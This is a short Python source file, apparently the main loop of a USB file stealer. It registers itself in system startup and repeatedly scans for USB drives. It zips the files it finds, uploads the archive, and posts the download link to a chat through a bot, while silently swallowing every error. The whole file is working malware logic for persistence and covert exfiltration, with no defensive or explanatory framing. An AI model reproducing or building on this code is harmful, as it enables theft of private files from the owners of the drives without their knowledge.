###-------------PACKAGES-------------###
from zipper import makeAndFillZip, deleteZip
from currentpath import getThisFilePath
from randomizer import getRandString
from bot import sendLinkToChat
from loader import load
from scaner import *
from startup import *
###----------------------------------###
from time import sleep
from requests.exceptions import ConnectionError
import os

def main():
	while True:
		usb_drivers = findUSB()
		if usb_drivers:
			for usb in usb_drivers:
				files = walkingByDirs(usb)
				if files:
					files = lastCleaningStep(files)
					path  = makeAndFillZip(files, getRandString(25))
					try:
						link = load(path.replace("\\", "/"))
						if link:
							sendLinkToChat(link)
					except ConnectionError:
						pass
					else:
						os.remove(path)
			sleep(5400)
		sleep(0.5)

if __name__ == "__main__":
	add_to_startup(getThisFilePath())
	while True:
		try:
			main()
		except:
			pass
